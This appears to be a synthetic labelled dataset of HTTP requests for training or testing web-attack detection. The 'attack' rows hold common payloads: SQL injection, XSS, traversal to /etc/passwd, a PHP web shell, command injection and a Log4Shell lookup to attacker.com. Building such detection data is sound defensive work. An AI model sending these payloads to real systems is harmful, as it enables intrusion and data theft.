id,timestamp,method,path,http_headers,body,label
37f820d1-9f65-48ff-ab3e-478cf45f9a02,2026-02-24 11:42:18,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
79c8f529-0748-4251-acee-fe41b3ed356f,2026-02-24 16:54:54,GET,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
b7ea3821-78d5-462f-a74d-4ebebb179bcb,2026-02-24 18:21:29,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
1a096138-7316-4c72-aaf4-7aaae0845a67,2026-02-25 05:59:42,POST,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
6bc54f68-2511-4644-a434-1b4daab77cdf,2026-02-25 07:08:40,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Nikto/2.1.6,<script>alert('XSS')</script>,attack
e07e466e-7462-4058-8444-359f376455f3,2026-02-24 18:00:09,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
67fb966d-c1c5-491b-b567-51f6a0a97390,2026-02-24 15:49:17,GET,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
8ce642a2-ff94-4cfc-8eaf-50ccdff1b653,2026-02-24 22:12:08,GET,/cart,User-Agent: Chrome/120.0.0.0,,normal
e0467a78-dfa7-4710-bda8-de7a198f1b34,2026-02-25 02:45:33,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: sqlmap/1.6,${jndi:ldap://attacker.com/a},attack
7df663be-2bf8-4013-9444-5f95c3395c3c,2026-02-25 05:30:41,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: python-requests/2.25.1,"UNION SELECT username, password FROM users --",attack
ce2c91b6-c828-4cf5-9804-4dc70fd25120,2026-02-25 05:42:21,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
c7efb0e9-811c-4a7c-a25e-7f184dfba442,2026-02-24 08:09:36,GET,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
b72b891f-c353-4bf3-b771-e9a18bb8bfdb,2026-02-24 23:16:20,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
dc8149b0-4a3d-4677-9f5e-43a8fd3117a8,2026-02-24 20:13:18,GET,/checkout,User-Agent: Chrome/120.0.0.0,,normal
f96b7bb5-b956-4e36-996b-e6005a8d704d,2026-02-25 04:07:51,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
2236fa35-29ad-4426-8f9f-7ee0c2121b0a,2026-02-25 03:02:42,GET,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: sqlmap/1.6,|| ping -c 4 127.0.0.1 ||,attack
678dfdb6-843d-4d1e-ad8c-5cf0e1f39f90,2026-02-24 20:13:27,POST,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
e08ccb3c-f969-40d6-afdb-6a5e89a65041,2026-02-24 13:09:20,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
d8f5e408-aa47-4998-ba3b-fe41f5887174,2026-02-24 21:44:33,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Nikto/2.1.6,<?php system($_GET['cmd']); ?>,attack
00171155-c54b-4a23-b89f-aa30d4f37a0d,2026-02-24 12:19:39,GET,/home,User-Agent: Safari/537.36,,normal
00e18d5f-440c-48ea-9ece-03dbf6a59b90,2026-02-25 07:58:52,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
5fca3f9b-0e77-4963-ad26-557ce73b1ee1,2026-02-25 08:39:21,GET,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: python-requests/2.25.1,${jndi:ldap://attacker.com/a},attack
fd81c33a-edea-4bd0-a609-d2d365c1812d,2026-02-25 06:19:40,POST,/blog/article-1,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
f5857ba8-b17c-4edf-b569-92a1e01327f0,2026-02-24 07:40:24,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<img src=x onerror=alert(1)>,attack
d1c23b25-0603-4aca-b22e-fda2dc13dce6,2026-02-25 03:11:08,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
13eeca29-85cf-49ed-9954-583e943794fe,2026-02-24 10:19:20,POST,/contact,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
684c9bbf-855a-47f9-9d3f-1cfeb6018e19,2026-02-24 10:54:57,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
c4471644-4b52-4666-81d7-0ba4a464c491,2026-02-24 20:37:18,POST,/api/v1/users,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
bb5f82ea-6777-48a1-be76-c84ca02291ce,2026-02-24 20:19:42,POST,/checkout,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
9e511ada-fe9a-4c76-85a7-f48b7cee7050,2026-02-25 01:38:48,GET,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
229e6ebf-1571-455f-b1e8-9c8addaebdaf,2026-02-24 14:57:42,GET,/cart,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
dbff96cd-295e-4c66-b1b3-8c85e0d1f4b5,2026-02-25 00:00:07,POST,/api/v1/orders?status=completed,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
8869b015-3e15-459e-9393-148885a523b1,2026-02-24 11:36:29,GET,/api/v1/users,User-Agent: Chrome/120.0.0.0,,normal
38c55965-37ea-4db7-b04c-7cb21221c5ba,2026-02-24 07:06:19,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
b797397f-1dbc-4660-8f54-dafec2556571,2026-02-24 13:33:26,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: curl/7.68.0,<img src=x onerror=alert(1)>,attack
cbf8738b-1407-4929-8444-5579e9a0f0b0,2026-02-24 18:03:16,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Nikto/2.1.6,<img src=x onerror=alert(1)>,attack
e2ec5fc5-2d64-40a3-8dcc-8d62039cac2b,2026-02-24 06:57:15,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
8ba97bdc-c276-4948-8801-bf9dc3ca56ac,2026-02-25 06:50:35,DELETE,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: curl/7.68.0,<script>alert('XSS')</script>,attack
64b72272-5daf-4f6a-8358-8d5923e9a6a5,2026-02-25 07:34:53,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
08c16893-5b31-47d7-a4af-c8bac514eee7,2026-02-25 03:41:01,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
49f24e15-be14-45cf-b9d5-9b13d6065152,2026-02-25 05:48:50,GET,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
edd30f17-9cad-4c80-a265-c878c871f431,2026-02-25 06:07:35,GET,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
83ef6d09-7899-4288-98cf-0a0f85de829c,2026-02-24 20:40:38,GET,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
b0785e1c-53cc-4193-8c51-1cea4c114575,2026-02-25 03:49:07,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
c09fa4dc-b4de-4273-8aa6-f3c890b40080,2026-02-24 09:45:35,GET,/home,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
c390f1eb-c9bd-4b08-907a-5a581c3ff668,2026-02-24 23:11:26,POST,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
6d85465f-bb41-4d23-b6cf-e22e43845eb7,2026-02-25 06:03:28,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: python-requests/2.25.1,SELECT * FROM users WHERE id = 1 OR 1=1,attack
bf1420da-2c99-467e-be22-5817d5179026,2026-02-24 17:34:35,GET,/home,User-Agent: Chrome/120.0.0.0,,normal
cbfc0adf-d6b9-493b-9382-7f0c59409954,2026-02-24 14:25:57,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Nikto/2.1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
e8338554-262d-49dc-a740-1d9ac11f41ee,2026-02-24 13:40:14,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
81f17b5c-2719-4966-808c-e5c4ffb6dfa6,2026-02-24 23:06:18,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Nikto/2.1.6,' OR 1=1 --,attack
e79d7694-c6d0-4c7d-b244-88238962a320,2026-02-24 17:27:45,DELETE,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Nikto/2.1.6,<script>alert('XSS')</script>,attack
64315384-b594-4da2-b795-7e0f8568c4de,2026-02-24 14:08:03,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: sqlmap/1.6,../../etc/passwd,attack
b32d2abf-22a2-40a4-9c1b-0d6641ce3153,2026-02-24 13:00:52,GET,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
42f6593b-0c68-462e-abe4-63a68ae1410a,2026-02-24 19:42:49,POST,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
124201ae-c4b0-4dba-ba7d-d1ca1169f762,2026-02-24 16:07:41,POST,/blog/article-1,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
c431a2b2-d2d6-47a2-93f7-d18984da4d8b,2026-02-25 10:23:24,GET,/products,User-Agent: Chrome/120.0.0.0,,normal
21923c79-f9c3-42ca-97dd-d1dadbab8a98,2026-02-24 19:28:24,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: sqlmap/1.6,${jndi:ldap://attacker.com/a},attack
8a333390-abcd-4ccb-80ef-21a542cc83a0,2026-02-24 08:03:52,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
a3ffc444-f9e5-4fb7-ae11-c2666d6d82c1,2026-02-24 15:10:03,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
7b5dbd14-7885-49bc-a145-e7eb6af26262,2026-02-24 13:08:07,POST,/checkout,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
f586fee4-459d-4395-832f-46d9411c0be8,2026-02-25 01:53:49,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Nikto/2.1.6,<?php system($_GET['cmd']); ?>,attack
11ba8ba9-f070-4f8c-ae63-e9ebf1551243,2026-02-24 12:00:06,POST,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
17e5864e-561f-4dbf-99bd-fab4dad104c5,2026-02-24 11:35:08,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: sqlmap/1.6,<img src=x onerror=alert(1)>,attack
d756732c-e440-48e9-8e7e-5441bf898b65,2026-02-24 18:30:52,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
cdaf813d-1ba7-499e-97e8-1b64fe48ccb8,2026-02-24 22:51:07,GET,/contact,User-Agent: Safari/537.36,,normal
b58a52e5-f596-4ced-8e13-af38e333d913,2026-02-25 08:35:46,DELETE,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: curl/7.68.0,|| ping -c 4 127.0.0.1 ||,attack
f7d2ff01-f24c-46a5-ac47-d00d2a45eac8,2026-02-25 02:13:38,GET,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
f4e13860-2254-4948-a011-479622bbb075,2026-02-24 21:13:28,GET,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Nikto/2.1.6,${jndi:ldap://attacker.com/a},attack
6784210c-0f0c-4928-9c56-59d83bc84a26,2026-02-25 07:51:04,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
9a73961b-8a83-4251-8995-f39a7ac05f17,2026-02-25 07:14:35,POST,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
d391ab7c-ed92-4e9b-897a-6842d76e857e,2026-02-24 22:13:12,GET,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
fbaaaf25-9ee9-4378-a66f-aafe899f4ce0,2026-02-25 07:09:40,DELETE,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: curl/7.68.0,/admin?user=admin'--,attack
e1f9c381-759b-4105-a245-f544c72672e2,2026-02-25 05:55:15,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: python-requests/2.25.1,<?php system($_GET['cmd']); ?>,attack
3400a67b-7338-49c4-90a1-fa85216e5292,2026-02-25 03:20:14,POST,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
d0d8261c-9ef7-4dc2-af3f-accc367ea0e0,2026-02-25 04:00:11,GET,/search?q=shoes,User-Agent: Chrome/120.0.0.0,,normal
64ff293e-cd3e-437f-8194-6caa6d280e48,2026-02-25 03:12:31,POST,/products?id=123,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
0206ba68-848e-430d-8a6e-a335974b17a2,2026-02-24 20:17:17,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
298e5aba-3c45-488b-b72d-ffc36ea5a627,2026-02-25 10:02:05,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
4756c7a6-cf3e-440f-b891-24ef29e4bcfb,2026-02-24 15:42:36,POST,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
db325869-01bc-4b82-8ba4-a03927a20123,2026-02-24 06:51:34,GET,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
918c03ac-f3ba-4c60-ab2e-07792ad94962,2026-02-24 08:40:57,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: python-requests/2.25.1,<?php system($_GET['cmd']); ?>,attack
9810b6dc-5a46-43f4-97f2-8b310ce565f8,2026-02-24 14:07:18,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: sqlmap/1.6,<img src=x onerror=alert(1)>,attack
fa402bb8-8dec-4469-afda-75e3cd3d915c,2026-02-24 14:05:31,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),SELECT * FROM users WHERE id = 1 OR 1=1,attack
4eb4f702-d3ed-4fa2-85a7-c77c43be615d,2026-02-25 00:20:32,GET,/products,User-Agent: Chrome/120.0.0.0,,normal
4826ee89-64dc-4a71-891f-0f921c3d910b,2026-02-24 19:51:18,POST,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
456d95c2-abe5-400c-8e51-759ae1499fb2,2026-02-24 17:15:24,GET,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
114019e1-2efc-4aec-ae77-ac08947a8633,2026-02-24 12:46:46,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: sqlmap/1.6,<?php system($_GET['cmd']); ?>,attack
8c28850c-5f74-441e-99a2-ea3c1588ea80,2026-02-24 13:46:13,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Nikto/2.1.6,${jndi:ldap://attacker.com/a},attack
d8246760-2f79-4ed7-8848-0f4eeea4d643,2026-02-24 10:16:43,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: sqlmap/1.6,../../etc/passwd,attack
9c094b13-2807-48fe-8052-6a334f6e7514,2026-02-24 17:44:49,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
4b604063-8c96-4ee2-9bc1-3893ba434a22,2026-02-24 16:32:32,GET,/products?id=123,User-Agent: Safari/537.36,,normal
f50d63aa-ebe2-41ab-831c-7687757d2ff1,2026-02-25 07:58:05,GET,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
4c72147b-2e3c-4f56-84f3-c2cb00ca8cb0,2026-02-25 00:28:17,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: python-requests/2.25.1,<script>alert('XSS')</script>,attack
ebade109-fdd2-400d-8b48-1c8e64276492,2026-02-24 08:19:52,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
dffd6681-5a64-4d45-aa84-e758016b9166,2026-02-24 06:41:30,POST,/api/v1/users,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
08729ecc-f338-49fa-a5a4-91266c74f039,2026-02-24 07:07:24,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: sqlmap/1.6,<script>alert('XSS')</script>,attack
81744341-e0f1-40bc-9956-0c870d245f45,2026-02-25 00:33:32,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Nikto/2.1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
96a07894-aa33-4aac-919c-f11a517e83a0,2026-02-24 13:33:23,POST,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
63424c90-b1ff-4592-9c8f-16652b602eea,2026-02-24 07:56:07,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
60b62f3d-b422-4aa1-8dc2-1e646bd722dc,2026-02-24 14:18:38,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
e02f9639-25d7-4ef1-9a0f-5e0037cd09ff,2026-02-25 09:37:54,GET,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
e1981a03-4f2f-47fb-a48c-cf39908ea4ec,2026-02-25 02:34:58,PUT,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: sqlmap/1.6,"UNION SELECT username, password FROM users --",attack
ba559827-a234-47af-b9d2-95d588033c7c,2026-02-24 13:02:36,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: curl/7.68.0,<script>alert('XSS')</script>,attack
714e7d63-274e-41c9-91d0-177d3b2339ad,2026-02-24 09:51:19,DELETE,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
dfae8806-4c01-4700-8efc-5ddc6f165a6f,2026-02-24 15:54:24,PUT,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: curl/7.68.0,|| ping -c 4 127.0.0.1 ||,attack
2c762185-0f34-4318-b340-1807b9feec35,2026-02-25 05:46:42,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
f65e3cc0-d1ed-464b-9419-c6cfb09c241a,2026-02-24 10:21:43,GET,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
162e6abc-9887-4b78-b35e-709e344789ac,2026-02-25 08:11:40,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
6dcbed29-4d5a-4600-a772-2924e7640e3e,2026-02-25 03:09:25,GET,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: python-requests/2.25.1,' OR 1=1 --,attack
bf9cae0d-d716-44aa-8dde-7841c58b948a,2026-02-25 05:00:29,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Nikto/2.1.6,|| ping -c 4 127.0.0.1 ||,attack
08591c5f-706c-4e62-b9d5-369e5589f3d2,2026-02-25 03:21:39,POST,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
21b13416-853a-4d8e-afde-5a72bc24e5a3,2026-02-25 05:52:24,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),/admin?user=admin'--,attack
2d65247d-e845-41b7-8a14-cd1430842bb3,2026-02-25 05:27:18,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
ba3fafc3-ea64-4c49-9823-b69b694e8a46,2026-02-24 08:28:55,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
a260db8d-e65b-45b6-ac40-ffeb4b6e41bf,2026-02-25 01:09:39,POST,/blog/article-1,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
8dbd5682-dab6-48c5-bbf3-8a4ae1b66fcd,2026-02-24 18:19:11,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Nikto/2.1.6,${jndi:ldap://attacker.com/a},attack
8399110f-82eb-4cb9-9f87-9537f8b94b42,2026-02-25 06:53:34,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Nikto/2.1.6,<script>alert('XSS')</script>,attack
8dfc6c1e-7a5a-457e-bb3e-32cfa0b10f2a,2026-02-25 10:01:39,POST,/checkout,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
0d6e20d7-27b0-4881-afbd-3a7a8e61454c,2026-02-25 04:19:04,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: sqlmap/1.6,../../etc/passwd,attack
92bad4fb-55ee-4782-8209-0c61a8f92fac,2026-02-24 20:49:08,POST,/api/v1/users,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
30893c44-2372-4274-b661-f5c49ac66ca4,2026-02-24 09:49:10,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
9460afc6-a7be-492b-af81-624820b64108,2026-02-24 09:55:46,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
94b81016-2fbc-4298-8b6e-b39d1ced8a41,2026-02-25 09:52:49,GET,/products?id=123,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
cc5f1fed-0856-49dc-91e4-d7294159ed87,2026-02-24 13:05:41,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
1d53259b-34c6-4115-a54d-473c3c873f9c,2026-02-24 20:28:11,PUT,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: curl/7.68.0,"UNION SELECT username, password FROM users --",attack
43488311-90cb-443a-8b9d-aae8b2bdbfb2,2026-02-25 05:55:06,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
fc57e2ab-49c4-4cb8-823e-58f45b3c99a2,2026-02-24 21:39:42,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
4faa3175-718d-44a1-9acd-d23cfc39e182,2026-02-25 04:16:25,POST,/home,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
addf56c5-b9bd-4d29-b3f4-880648bf3564,2026-02-25 08:13:00,GET,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
aff0646b-58a9-4dce-b00e-8f1c1d80e93c,2026-02-25 07:11:15,GET,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
6344ef2e-90fe-4f55-9464-ad8a046f1670,2026-02-24 20:10:58,POST,/home,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
515396d1-a43c-418e-8e5b-1a11a925b4e0,2026-02-24 11:48:39,DELETE,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: curl/7.68.0,<script>alert('XSS')</script>,attack
3d21f52e-b89a-430c-a260-016ad8ee771a,2026-02-24 13:10:33,POST,/products?id=123,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
a1111310-a9b2-4e3e-81fc-666ed8510628,2026-02-25 08:43:16,DELETE,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<script>alert('XSS')</script>,attack
3ef5be62-5f8c-42a0-b755-8fddefe8e5ed,2026-02-24 16:19:03,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: python-requests/2.25.1,/admin?user=admin'--,attack
1e900b62-a25a-47ce-a55b-6669d23df49d,2026-02-24 13:54:00,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
62d4903b-91aa-43fc-88c4-0a1a5f75bfe6,2026-02-25 05:30:25,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
8cd5ad95-8d44-4c31-ae72-387ac3d3d5c5,2026-02-24 08:27:10,GET,/products?id=123,User-Agent: Chrome/120.0.0.0,,normal
7575fb3b-b8d5-4cbd-8531-5743ecd8ed94,2026-02-25 03:21:21,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
